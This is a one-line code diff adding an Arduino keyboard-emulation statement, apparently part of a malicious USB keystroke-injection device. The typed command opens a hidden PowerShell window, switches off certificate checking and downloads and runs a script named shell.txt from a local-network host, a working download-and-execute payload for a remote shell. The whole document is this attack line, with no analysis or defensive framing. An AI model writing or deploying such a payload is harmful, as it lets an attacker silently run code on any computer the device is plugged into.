@@ -1,0 +1,1 @@
+Keyboard.print("powershell -windowstyle hidden \"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.237/shell.txt')\"");
